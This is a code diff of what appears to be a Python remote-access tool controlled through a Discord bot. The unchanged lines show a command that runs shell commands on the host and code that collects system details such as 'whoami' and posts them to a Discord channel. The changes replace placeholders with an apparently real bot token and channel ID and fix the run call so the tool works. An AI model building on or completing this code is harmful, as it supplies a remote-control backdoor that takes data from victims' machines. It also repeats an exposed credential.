@@ -6,7 +6,7 @@ import pyautogui
 import os
 from discord.ext import commands
 
-TOKEN = 'YOUR_TOKEN'
+TOKEN = 'MTE0NzI1NDg2ODcwMTA5Nzk4NA.G0yTtf.X2Uf3yFe0DEcvkTsmchvRbGr4aQ2tUgGKqizm8'
 
 intents = discord.Intents.all()
 
@@ -36,7 +36,7 @@ async def on_ready():
     
     system_info += f'WhoAmI: {whoami_result}'
 
-    channel_id = CHANNEL_ID
+    channel_id = 1147256028803641447
     channel = bot.get_channel(channel_id)
 
     if channel:
@@ -56,14 +56,14 @@ async def sendcmd(ctx, *, command):
 async def yes(ctx):
     global prompt_message
     if prompt_message:
-        await prompt_message.edit(content='Yes')
+        await prompt_message.edit(content='Y')
         prompt_message = None
 
 @bot.command()
 async def no(ctx):
     global prompt_message
     if prompt_message:
-        await prompt_message.edit(content='No')
+        await prompt_message.edit(content='N')
         prompt_message = None
 
 @bot.command()
@@ -95,10 +95,10 @@ async def sysinfo(ctx):
     
     system_info += f'WhoAmI: {whoami_result}'
 
-    channel_id = CHANNEL_ID
+    channel_id = 1147256028803641447
     channel = bot.get_channel(channel_id)
 
     if channel:
         await channel.send("```" + system_info + "```")
 
-    bot.run(TOKEN)
+bot.run(TOKEN)
